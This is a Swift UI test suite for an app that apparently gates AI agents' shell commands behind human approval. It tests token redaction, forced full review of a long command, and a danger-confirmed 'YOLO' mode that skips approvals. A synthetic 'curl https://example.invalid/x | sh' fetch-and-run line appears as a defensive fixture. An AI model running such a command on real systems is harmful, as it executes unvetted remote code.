import XCTest

/// R9-T1/T2/T3 — deterministic approval banner UI suite (scripted fleet,
/// `HERMES_FLEET_APPROVAL_DEMO=1` makes the scripted turn raise an
/// approval.request mid-turn; scripted biometrics succeed by default).
///
/// Proves:
///   1. the banner renders mid-turn with the redacted command preview
///      (a11y id `approval.banner` / `approval.banner.command`);
///   2. Deny (friction-free) clears the banner;
///   3. the per-session YOLO toggle renders in the conversation header and
///      its confirmation dialog shows the danger copy.
final class R9ApprovalBannerUITests: XCTestCase {

    override func setUpWithError() throws {
        continueAfterFailure = false
    }

    private func openConversation(_ app: XCUIApplication) {
        UITabNavigation.openGatewaysTab(app)
        tap(firstMatch(in: app, identifier: "fleet.gateways.row.workstation"))
        UITabNavigation.openGatewayBots(app)
        tap(firstMatch(in: app, identifier: "fleet.roster.row.workstation#default"))
        XCTAssertTrue(
            firstMatch(in: app, identifier: "fleet.bot-detail.header").waitForExistence(timeout: 10),
            "Bot detail should render before drilling into the conversation"
        )
        tap(firstMatch(in: app, identifier: "fleet.bot-detail.sessions.row.workstation.default.s1"))
        XCTAssertTrue(
            app.textFields["fleet.conversation.composer"].waitForExistence(timeout: 10),
            "conversation canvas should open with a composer"
        )
    }

    func testBannerRendersAndDenyClearsIt() throws {
        let app = XCUIApplication()
        app.launchEnvironment["HERMES_FLEET_APPROVAL_DEMO"] = "1"
        app.launchEnvironment["HERMES_FLEET_NAV_RESET"] = "1"
        app.launch()
        openConversation(app)

        // Send a prompt — the scripted turn raises an approval at ~400ms.
        let composer = app.textFields["fleet.conversation.composer"]
        XCTAssertTrue(composer.waitForExistence(timeout: 10))
        // Poll until enabled (phase .ready), the U6 waitUntilEnabled shape.
        let deadline = Date().addingTimeInterval(15)
        while !composer.isEnabled && Date() < deadline {
            Thread.sleep(forTimeInterval: 0.2)
        }
        XCTAssertTrue(composer.isEnabled, "composer should enable once the session is ready")
        composer.tap()
        composer.typeText("hello approvals")
        tap(firstMatch(in: app, identifier: "fleet.conversation.send"))

        // The approval banner appears with the redacted command preview.
        let banner = firstMatch(in: app, identifier: "approval.banner")
        XCTAssertTrue(banner.waitForExistence(timeout: 15),
                      "approval banner should render mid-turn")
        let bannerLabel = banner.label
        XCTAssertTrue(bannerLabel.contains("[REDACTED]"),
                      "the bearer token in the scripted command must be masked: \(bannerLabel)")
        XCTAssertFalse(bannerLabel.contains("fixture-bearer-demo"),
                       "the raw demo token must NEVER render")

        // Deny is friction-free: one tap clears the banner.
        let deny = firstMatch(in: app, identifier: "approval.deny")
        XCTAssertTrue(deny.waitForExistence(timeout: 5))
        deny.tap()
        let gone = NSPredicate(format: "exists == 0")
        let vanished = XCTNSPredicateExpectation(predicate: gone, object: banner)
        wait(for: [vanished], timeout: 10)
        XCTAssertFalse(banner.exists, "deny should clear the banner")
        attachScreenshot(of: app, name: "r9-approval-banner-denied")
    }

    /// P0.2a — a 30-line command with `curl ... | sh` hidden in the middle:
    /// the header names the origin, the collapsed card marks the elision,
    /// Approve is off until the full command has been reviewed, Deny is never
    /// gated, and gateway `detail` sits in an "untrusted" labelled block.
    func testLongCommandRequiresFullReviewBeforeApprove() throws {
        let app = XCUIApplication()
        app.launchEnvironment["HERMES_FLEET_APPROVAL_DEMO"] = "long"
        app.launchEnvironment["HERMES_FLEET_NAV_RESET"] = "1"
        app.launch()
        openConversation(app)
        sendPrompt(app, text: "hello long approval")

        let banner = firstMatch(in: app, identifier: "approval.banner")
        XCTAssertTrue(banner.waitForExistence(timeout: 15), "approval banner should render mid-turn")

        // Origin header is present and read before the command.
        let origin = firstMatch(in: app, identifier: "approval.origin")
        XCTAssertTrue(origin.waitForExistence(timeout: 5), "origin header should render")
        XCTAssertTrue(origin.label.contains("From gateway"), "origin label: \(origin.label)")
        XCTAssertTrue(banner.label.hasPrefix("Approval required. From gateway"),
                      "VoiceOver summary must name the origin before the command: \(banner.label)")

        // The collapsed card marks the elision and never shows the hidden pipe.
        XCTAssertTrue(firstMatch(in: app, identifier: "approval.banner.elision").waitForExistence(timeout: 5),
                      "the collapsed card must mark the elided lines")
        XCTAssertFalse(banner.label.contains("| sh"), "the middle of the command is not shown inline")
        let inlineCommand = firstMatch(in: app, identifier: "approval.banner.command")
        XCTAssertTrue(inlineCommand.label.contains("echo step-30"), "the tail of the command is shown: \(inlineCommand.label)")
        XCTAssertFalse(inlineCommand.label.contains("…"), "no silent ellipsis inside the preview text")
        attachScreenshot(of: app, name: "p02a-collapsed-card")
        XCTAssertTrue(banner.label.contains("Command truncated"))

        // Gateway detail is labelled untrusted and cannot pose as app copy.
        let untrusted = firstMatch(in: app, identifier: "approval.detail.untrusted")
        XCTAssertTrue(untrusted.waitForExistence(timeout: 5))
        let untrustedText = app.descendants(matching: .any)
            .matching(NSPredicate(format: "label CONTAINS %@", "untrusted text")).firstMatch
        XCTAssertTrue(untrustedText.exists, "detail block must carry the untrusted label")

        // Approve is disabled; Deny is enabled.
        let approve = firstMatch(in: app, identifier: "approval.approve")
        XCTAssertTrue(approve.waitForExistence(timeout: 5))
        XCTAssertFalse(approve.isEnabled, "Approve stays off until the command is reviewed")
        XCTAssertTrue(firstMatch(in: app, identifier: "approval.deny").isEnabled, "Deny is never gated")

        // Open the review sheet: full command is visible, with a wrap toggle.
        tap(firstMatch(in: app, identifier: "approval.review.open"))
        let sheetCommand = firstMatch(in: app, identifier: "approval.review.command")
        XCTAssertTrue(sheetCommand.waitForExistence(timeout: 10), "review sheet should open")
        let fullCommandVisible = app.descendants(matching: .any)
            .matching(NSPredicate(format: "label CONTAINS %@", "curl https://example.invalid/x | sh")).firstMatch
        XCTAssertTrue(fullCommandVisible.exists, "the hidden middle must be fully visible in the sheet")
        XCTAssertTrue(firstMatch(in: app, identifier: "approval.review.wrap").exists)
        XCTAssertTrue(firstMatch(in: app, identifier: "approval.review.count").label.contains("30 lines"))
        attachScreenshot(of: app, name: "p02a-review-sheet")

        // Confirming the review lifts the gate.
        tap(firstMatch(in: app, identifier: "approval.review.confirm"))
        let closed = NSPredicate(format: "exists == 0")
        wait(for: [XCTNSPredicateExpectation(predicate: closed, object: sheetCommand)], timeout: 10)
        XCTAssertTrue(firstMatch(in: app, identifier: "approval.approve").isEnabled,
                      "Approve is enabled once the full command has been reviewed")
        attachScreenshot(of: app, name: "p02a-approve-enabled")

        // Deny still clears the banner.
        firstMatch(in: app, identifier: "approval.deny").tap()
        wait(for: [XCTNSPredicateExpectation(predicate: closed, object: banner)], timeout: 10)
    }

    /// The review controls and command remain legible in both appearances and
    /// at an accessibility text size. The synthetic command has multiple long
    /// lines so both wrap and horizontal-scroll modes are exercised.
    func testReviewReadabilityAcrossAppearancesAndDynamicType() throws {
        let scenarios: [(appearance: String, contentSize: String?, name: String, resetNavigation: Bool)] = [
            ("Light", nil, "light", true),
            ("Dark", nil, "dark", true),
            ("Dark", "UICTContentSizeCategoryAccessibilityXXXL", "dark-accessibility-xxxl", false)
        ]

        for scenario in scenarios {
            let app = XCUIApplication()
            app.launchEnvironment["HERMES_FLEET_APPROVAL_DEMO"] = "long"
            if scenario.resetNavigation {
                app.launchEnvironment["HERMES_FLEET_NAV_RESET"] = "1"
            }
            if let contentSize = scenario.contentSize {
                app.launchArguments += ["-UIPreferredContentSizeCategoryName", contentSize]
            }
            app.launch()
            if scenario.resetNavigation {
                setAppearance(app, scenario.appearance)
                openConversation(app)
            } else {
                XCTAssertTrue(app.textFields["fleet.conversation.composer"].waitForExistence(timeout: 15),
                              "the saved conversation should restore directly at accessibility text size")
            }
            sendPrompt(app, text: "review readability")

            tap(firstMatch(in: app, identifier: "approval.review.open"))
            let command = firstMatch(in: app, identifier: "approval.review.command")
            XCTAssertTrue(command.waitForExistence(timeout: 10), "command should appear in \(scenario.appearance)")
            let fullCommandAccessibility = app.descendants(matching: .any)
                .matching(NSPredicate(format: "label CONTAINS %@", "curl https://example.invalid/x | sh"))
                .firstMatch
            XCTAssertTrue(fullCommandAccessibility.exists,
                          "full command should remain available in \(scenario.appearance)")
            attachScreenshot(of: app, name: "approval-review-\(scenario.name)-wrapped")

            let wrap = firstMatch(in: app, identifier: "approval.review.wrap")
            XCTAssertTrue(wrap.exists, "wrap control should remain visible in \(scenario.appearance)")
            let confirm = firstMatch(in: app, identifier: "approval.review.confirm")
            let reviewSheet = firstMatch(in: app, identifier: "approval.review.sheet")
            XCTAssertTrue(reviewSheet.waitForExistence(timeout: 5), "review sheet should be present")

            // At accessibility XXXL the origin metadata can consume most of
            // the initial viewport. Verify that a real vertical scroll brings
            // at least one complete command line above the pinned action bar.
            // The bounded loop waits on geometry rather than timing guesses.
            let globalFirstScrollView = app.scrollViews.firstMatch
            let verticalScroll = reviewSheet.scrollViews.firstMatch
            if scenario.contentSize != nil {
                XCTAssertTrue(verticalScroll.waitForExistence(timeout: 5),
                              "review content should expose its vertical scroll view")
                attachScrollQueryDiagnostic(
                    app: app,
                    sheet: reviewSheet,
                    global: globalFirstScrollView,
                    scoped: verticalScroll,
                    name: "approval-review-\(scenario.name)-scroll-query"
                )
                XCTAssertTrue(verticalScroll.isHittable)
                let initialCommandY = command.frame.minY
                let requiredCommandHeight = max(
                    200,
                    readableViewport(in: verticalScroll, above: confirm).height * 0.35
                )
                for _ in 0..<8 {
                    if visibleCommandHeight(command, in: verticalScroll, above: confirm) >= requiredCommandHeight {
                        break
                    }
                    verticalScroll.swipeUp()
                }
                XCTAssertLessThan(command.frame.minY, initialCommandY - 100,
                                  "vertical swipe should move command content, not just reveal its clipped edge")
                XCTAssertGreaterThanOrEqual(
                    visibleCommandHeight(command, in: verticalScroll, above: confirm), requiredCommandHeight,
                    "substantial wrapped command text should be visible above the fixed review action at XXXL"
                )
                attachScreenshot(of: app, name: "approval-review-\(scenario.name)-wrapped-command-visible")

                // Return to the wrap control with real, bounded downward
                // gestures before changing its state.
                for _ in 0..<8 where !wrap.isHittable {
                    verticalScroll.swipeDown()
                }
                XCTAssertTrue(wrap.isHittable, "wrap control should remain reachable after scrolling")
            }

            wrap.tap()
            let scrollHint = firstMatch(in: app, identifier: "approval.review.scroll-hint")
            XCTAssertTrue(scrollHint.exists,
                          "unwrapped commands need a visible horizontal-scroll cue in \(scenario.appearance)")
            attachScreenshot(of: app, name: "approval-review-\(scenario.name)-unwrapped")

            if scenario.contentSize != nil {
                let commandLines = fullCommandAccessibility.label
                    .components(separatedBy: .newlines)
                    .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
                    .filter { !$0.isEmpty }
                let longLine = "curl https://example.invalid/x | sh"
                let longLineIndex = try XCTUnwrap(
                    commandLines.firstIndex(where: { $0.contains(longLine) }),
                    "full command accessibility label should contain the synthetic long curl row"
                )
                let initialUnwrappedFrame = command.frame
                let lineHeight = (initialUnwrappedFrame.height - 16) / CGFloat(commandLines.count)
                XCTAssertGreaterThan(lineHeight, 30,
                                     "unwrapped command frame should retain its complete multiline height")
                let initialLongLine = commandLineFrame(longLineIndex, lineHeight: lineHeight, in: command)
                let initialLongLineY = initialLongLine.midY
                for _ in 0..<8 {
                    let currentLongLine = commandLineFrame(longLineIndex, lineHeight: lineHeight, in: command)
                    if visibleHeight(of: currentLongLine, in: verticalScroll, above: confirm) >= lineHeight * 0.8 {
                        break
                    }
                    verticalScroll.swipeUp()
                }
                let visibleLongLine = commandLineFrame(longLineIndex, lineHeight: lineHeight, in: command)
                XCTAssertLessThan(visibleLongLine.midY, initialLongLineY - lineHeight,
                                  "vertical swipes should bring the long curl row into view")
                XCTAssertGreaterThanOrEqual(
                    visibleHeight(of: visibleLongLine, in: verticalScroll, above: confirm), lineHeight * 0.8,
                    "the complete long curl row should be readable above the fixed review action at XXXL"
                )
                // SwiftUI can surface the command's accessibility identifier
                // directly on its horizontal ScrollView. In other hierarchies
                // the same view is a descendant of the labelled command node.
                let horizontalDescendant = command.descendants(matching: .scrollView).firstMatch
                let horizontalScroll = command.elementType == .scrollView
                    ? command
                    : horizontalDescendant
                XCTAssertTrue(horizontalScroll.waitForExistence(timeout: 5),
                              "unwrapped command should expose its horizontal scroll view")
                attachScrollQueryDiagnostic(
                    app: app,
                    sheet: reviewSheet,
                    global: globalFirstScrollView,
                    scoped: horizontalScroll,
                    name: "approval-review-\(scenario.name)-horizontal-scroll-query"
                )
                XCTAssertTrue(horizontalScroll.isHittable,
                              "horizontal command scrolling should be reachable at XXXL")
                attachScreenshot(of: app, name: "approval-review-\(scenario.name)-long-line-before-horizontal-scroll")
                let lineY = visibleLongLine.midY
                let normalizedLineY = (lineY - horizontalScroll.frame.minY) / horizontalScroll.frame.height
                XCTAssertGreaterThanOrEqual(normalizedLineY, 0)
                XCTAssertLessThanOrEqual(normalizedLineY, 1)
                let dragStart = horizontalScroll.coordinate(
                    withNormalizedOffset: CGVector(dx: 0.88, dy: normalizedLineY)
                )
                let dragEnd = horizontalScroll.coordinate(
                    withNormalizedOffset: CGVector(dx: 0.12, dy: normalizedLineY)
                )
                // The first bounded drag can expose the URL's middle without
                // reaching the shell suffix at accessibility XXXL. Repeat
                // the same real gesture on the still-visible curl row until
                // the right edge is in view; the captured pixels below verify
                // the resulting text rather than trusting gesture delivery.
                for _ in 0..<4 {
                    dragStart.press(forDuration: 0.1, thenDragTo: dragEnd)
                }
                attachScreenshot(of: app, name: "approval-review-\(scenario.name)-long-line-right-suffix")
                horizontalScroll.swipeRight()

                for _ in 0..<8 where !wrap.isHittable {
                    verticalScroll.swipeDown()
                }
                XCTAssertTrue(wrap.isHittable, "wrap control should be reachable after horizontal review")
            }

            wrap.tap()
            XCTAssertFalse(scrollHint.exists)

            XCTAssertTrue(confirm.isHittable, "review action should remain reachable in \(scenario.appearance)")
            XCTAssertTrue(confirm.label.contains("I reviewed the full command"),
                          "review action must have a visible accessible label in \(scenario.appearance)")
            if scenario.name == "dark" {
                firstMatch(in: app, identifier: "approval.review.close").tap()
                XCTAssertTrue(app.textFields["fleet.conversation.composer"].waitForExistence(timeout: 10),
                              "closing review should return to the saved conversation before relaunch")
            }
            app.terminate()
        }

        let cleanup = XCUIApplication()
        cleanup.launchEnvironment["HERMES_FLEET_NAV_RESET"] = "1"
        cleanup.launch()
        setAppearance(cleanup, "System", accent: "Purple")
        cleanup.terminate()
    }

    func testYoloToggleShowsDangerConfirmation() throws {
        let app = XCUIApplication()
        app.launchEnvironment["HERMES_FLEET_APPROVAL_DEMO"] = "1"
        app.launchEnvironment["HERMES_FLEET_NAV_RESET"] = "1"
        app.launch()
        openConversation(app)

        // The toggle renders in the conversation header (off by default).
        let toggle = firstMatch(in: app, identifier: "approval.yolo.toggle")
        XCTAssertTrue(toggle.waitForExistence(timeout: 10),
                      "per-session YOLO toggle should render in the conversation header")

        // Tapping it (currently off) presents the DANGER confirmation —
        // nothing enables without the explicit confirm.
        toggle.tap()
        let enableButton = app.descendants(matching: .any)
            .matching(NSPredicate(format: "label CONTAINS %@", "skip approvals"))
            .firstMatch
        XCTAssertTrue(enableButton.waitForExistence(timeout: 10),
                      "YOLO enable must show the danger confirmation dialog")

        // Cancel keeps YOLO off.
        let cancel = app.buttons["Cancel"]
        if cancel.waitForExistence(timeout: 3) {
            cancel.tap()
        }
        attachScreenshot(of: app, name: "r9-yolo-confirmation")
    }

    /// P0.2b: a failed presence check after the confirmation leaves YOLO off
    /// and shows inline feedback (never silent).
    func testYoloEnableFailedPresenceShowsFeedbackAndStaysOff() throws {
        let app = XCUIApplication()
        app.launchEnvironment["HERMES_FLEET_APPROVAL_DEMO"] = "1"
        app.launchEnvironment["HERMES_FLEET_NAV_RESET"] = "1"
        app.launchEnvironment["HERMES_FLEET_APPROVAL_BIOMETRIC"] = "fail"
        app.launch()
        openConversation(app)

        let toggle = firstMatch(in: app, identifier: "approval.yolo.toggle")
        XCTAssertTrue(toggle.waitForExistence(timeout: 10))
        toggle.tap()
        let enableButton = app.descendants(matching: .any)
            .matching(NSPredicate(format: "label CONTAINS %@", "skip approvals"))
            .firstMatch
        XCTAssertTrue(enableButton.waitForExistence(timeout: 10))
        enableButton.tap()

        let notice = app.alerts["YOLO not enabled"]
        XCTAssertTrue(notice.waitForExistence(timeout: 10),
                      "a failed presence check must explain itself")
        XCTAssertTrue(notice.staticTexts
            .matching(NSPredicate(format: "label CONTAINS %@", "YOLO stays off")).firstMatch.exists)
        notice.buttons["OK"].tap()
        XCTAssertEqual(toggle.label, "YOLO off")
    }

    // MARK: - Helpers (same shapes as the U6 suite)

    private func sendPrompt(_ app: XCUIApplication, text: String) {
        let composer = app.textFields["fleet.conversation.composer"]
        XCTAssertTrue(composer.waitForExistence(timeout: 10))
        let deadline = Date().addingTimeInterval(15)
        while !composer.isEnabled && Date() < deadline {
            Thread.sleep(forTimeInterval: 0.2)
        }
        XCTAssertTrue(composer.isEnabled, "composer should enable once the session is ready")
        composer.tap()
        composer.typeText(text)
        tap(firstMatch(in: app, identifier: "fleet.conversation.send"))
    }

    private func tap(_ element: XCUIElement) {
        XCTAssertTrue(element.waitForExistence(timeout: 10), "element \(element) should appear")
        element.tap()
    }

    private func setAppearance(_ app: XCUIApplication, _ appearance: String, accent: String = "White") {
        UITabNavigation.openSettings(app)
        let picker = firstMatch(in: app, identifier: "fleet.settings.appearance")
        XCTAssertTrue(picker.waitForExistence(timeout: 10), "appearance setting should render")
        picker.tap()
        let option = app.buttons[appearance].firstMatch
        XCTAssertTrue(option.waitForExistence(timeout: 5), "appearance menu should offer \(appearance)")
        option.tap()
        XCTAssertTrue(picker.label.contains("Appearance, \(appearance)"),
                      "app setting should explicitly use \(appearance)")
        let accentPicker = firstMatch(in: app, identifier: "fleet.settings.accent")
        accentPicker.tap()
        let accentOption = app.buttons[accent].firstMatch
        XCTAssertTrue(accentOption.waitForExistence(timeout: 5))
        accentOption.tap()
        XCTAssertTrue(accentPicker.label.contains("Accent, \(accent)"),
                      "review regression must exercise explicit \(accent) highlight ink")
    }

    private func firstMatch(in app: XCUIApplication, identifier: String) -> XCUIElement {
        app.descendants(matching: .any)[identifier]
    }

    private func waitUntilEnabled(_ element: XCUIElement, timeout: TimeInterval) {
        let enabled = NSPredicate(format: "isEnabled == true")
        let expectation = XCTNSPredicateExpectation(predicate: enabled, object: element)
        wait(for: [expectation], timeout: timeout)
    }

    private func attachScreenshot(of app: XCUIApplication, name: String) {
        let shot = XCUIScreen.main.screenshot()
        let attachment = XCTAttachment(screenshot: shot)
        attachment.name = name
        attachment.lifetime = .keepAlways
        add(attachment)
    }

    /// Returns only the command area visible within the review scroll viewport
    /// and above the pinned confirmation footer. This avoids treating content
    /// hidden beneath the footer as readable.
    private func visibleCommandHeight(_ command: XCUIElement, in scrollView: XCUIElement,
                                     above footer: XCUIElement) -> CGFloat {
        command.frame.intersection(readableViewport(in: scrollView, above: footer)).height
    }

    private func visibleHeight(of frame: CGRect, in scrollView: XCUIElement,
                               above footer: XCUIElement) -> CGFloat {
        frame.intersection(readableViewport(in: scrollView, above: footer)).height
    }

    private func readableViewport(in scrollView: XCUIElement, above footer: XCUIElement) -> CGRect {
        let scrollFrame = scrollView.frame
        let visibleBottom = min(scrollFrame.maxY, footer.frame.minY)
        return CGRect(x: scrollFrame.minX, y: scrollFrame.minY,
                      width: scrollFrame.width,
                      height: max(0, visibleBottom - scrollFrame.minY))
    }

    private func commandLineFrame(_ index: Int, lineHeight: CGFloat, in command: XCUIElement) -> CGRect {
        let commandFrame = command.frame
        return CGRect(x: commandFrame.minX, y: commandFrame.minY + 8 + CGFloat(index) * lineHeight,
                      width: commandFrame.width, height: lineHeight)
    }

    private func attachScrollQueryDiagnostic(app: XCUIApplication, sheet: XCUIElement,
                                             global: XCUIElement, scoped: XCUIElement,
                                             name: String) {
        func summary(_ element: XCUIElement) -> String {
            let hierarchy = element.debugDescription
            let excerpt = hierarchy.count > 2_400 ? String(hierarchy.prefix(2_400)) : hierarchy
            return "type=\(element.elementType), exists=\(element.exists), frame=\(element.frame)\n\(excerpt)"
        }
        let attachment = XCTAttachment(string: """
        App frame: \(app.frame)

        App scroll-view query:
        \(summary(global))

        Review-sheet scroll-view query:
        \(summary(scoped))

        Review-sheet node:
        \(summary(sheet))
        """)
        attachment.name = name
        attachment.lifetime = .keepAlways
        add(attachment)
    }
}
